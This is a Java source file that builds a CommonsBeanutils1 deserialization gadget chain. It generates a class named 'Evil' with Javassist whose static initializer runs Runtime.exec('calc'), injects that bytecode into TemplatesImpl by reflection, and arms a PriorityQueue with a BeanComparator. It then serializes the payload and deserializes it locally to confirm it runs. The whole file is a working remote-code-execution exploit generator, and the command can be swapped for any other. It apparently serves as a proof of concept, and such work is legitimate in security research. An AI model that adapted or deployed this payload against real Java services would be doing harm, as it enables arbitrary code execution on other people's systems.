package com.example;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import java.util.Comparator;



public class CB1 {
    public static void main(String[] args) throws Exception {
        ClassPool pool=ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc=pool.makeClass("Evil");
        String cmd="java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String rename="Evil"+System.nanoTime();
        cc.setName(rename);
        byte[] bytes=cc.toBytecode();
        byte[][] target=new byte[][]{bytes};

        TemplatesImpl templates=new TemplatesImpl();
        Field name=TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "a");
        Field bytecodes=TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, target);
        Field tfactory=TemplatesImpl.class.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);

        
        BeanComparator comparator=new BeanComparator();
        Field property=BeanComparator.class.getDeclaredField("property");
        property.setAccessible(true);
        property.set(comparator, "outputProperties");


        PriorityQueue queue=new PriorityQueue<>(new BeanComparator());
        queue.add(1);
        queue.add(1);
        Field q=PriorityQueue.class.getDeclaredField("queue");
        q.setAccessible(true);
        Object[] queueArray=(Object[])q.get(queue);
        queueArray[0]=templates;
        queueArray[1]=templates;

        Field size=PriorityQueue.class.getDeclaredField("size");
        size.setAccessible(true);
        size.set(queue, 2);

        Field c=PriorityQueue.class.getDeclaredField("comparator");
        c.setAccessible(true);
        c.set(queue, comparator);


        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(queue);
        oos.close();
        byte[] payload=baos.toByteArray();
        
        ByteArrayInputStream bais=new ByteArrayInputStream(payload);
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
        System.out.println("Payload executed successfully!");
    }
}